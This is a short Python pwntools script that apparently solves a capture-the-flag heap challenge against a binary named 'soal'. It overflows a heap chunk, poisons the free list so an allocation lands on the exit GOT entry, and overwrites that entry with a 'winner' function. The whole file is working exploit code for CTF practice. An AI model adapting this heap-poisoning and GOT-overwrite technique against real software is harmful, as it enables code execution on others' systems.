from pwn import *

context.terminal = "tmux splitw -h".split()

elf = context.binary = ELF('soal')
libc = elf.libc
p = elf.process()

def add(idx,size):
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())

def fil(idx,data):
    p.sendlineafter(b': ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', data)

def show(idx):
    p.sendlineafter(b': ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.recvuntil(b'content : ')
    return p.recvline(0).strip()

def free(idx):
    p.sendlineafter(b': ', b'4')
    p.sendlineafter(b': ', str(idx).encode())

add(0, 0x30)
add(1, 0x10)
add(2, 0x30)

fil(0, cyclic(0x38) + p64(0x41))
free(0)
free(2)
free(1)

add(0, 0x30)
fil(0, cyclic(0x18) + p64(0x41) + p64(elf.got.exit))

add(1, 0x30)
add(2, 0x30)
fil(2, p64(elf.sym.winner))

p.sendlineafter(b': ', b'5')

p.interactive()
